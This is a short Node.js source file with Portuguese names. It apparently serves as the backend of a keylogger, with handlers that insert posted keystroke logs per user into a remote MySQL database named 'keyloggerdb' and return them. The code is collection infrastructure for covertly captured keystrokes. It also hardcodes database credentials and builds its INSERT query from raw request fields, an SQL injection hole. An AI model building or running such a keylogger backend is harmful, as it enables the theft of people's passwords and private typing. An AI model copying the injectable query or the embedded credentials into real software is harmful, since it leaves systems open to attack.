import mysql from 'mysql';

export function carregarTodos(req,res){

    var con = mysql.createConnection({
        host: "keyloggerdbinstance.cnvf4sntgqxj.sa-east-1.rds.amazonaws.com",
        user: "sa",
        password: "sasasasa",
        database: "keyloggerdb"
      });
      
      con.connect(function(err) {
        if (err) 
            throw err;

        var sql = 'SELECT * FROM KeyLogs';

        con.query(sql, function (err, result) {
          if (err) 
            throw err;

          res.send(result);
        });
      });
}

export function carregarKeylog(req,res){

    var con = mysql.createConnection({
        host: "keyloggerdbinstance.cnvf4sntgqxj.sa-east-1.rds.amazonaws.com",
        user: "sa",
        password: "sasasasa",
        database: "keyloggerdb"
      });
      
      con.connect(function(err) {
        if (err) 
            throw err;

        var sql = 'select * from KeyLogs';

        con.query(sql, function (err, result) {
          if (err) 
            throw err;

          console.log(req.params.Id);  

          var resultado = result.filter(i => i.Id == req.params.Id);
          console.log("Result: " + resultado[0]);
          res.send(resultado);          

        });
      });
}


export function inserirKeyLogs(req,res){

    var con = mysql.createConnection({
        host: "keyloggerdbinstance.cnvf4sntgqxj.sa-east-1.rds.amazonaws.com",
        user: "sa",
        password: "sasasasa",
        database: "keyloggerdb"
      });

      con.connect(function(err) {
        if (err) 
            throw err;
            
        console.log("body: " + req.body.json);
        console.log("body: " + req.body.usuario);
            
        var sql = `INSERT INTO KeyLogs(json,usuario) 
        values ('${ req.body.json }','${ req.body.usuario }')`;
        
        con.query(sql, function (err, result) {
            if (err) 
                throw err;
            if(result.affectedRows >= 1)
                res.send('Incluído');
        });
      });

}
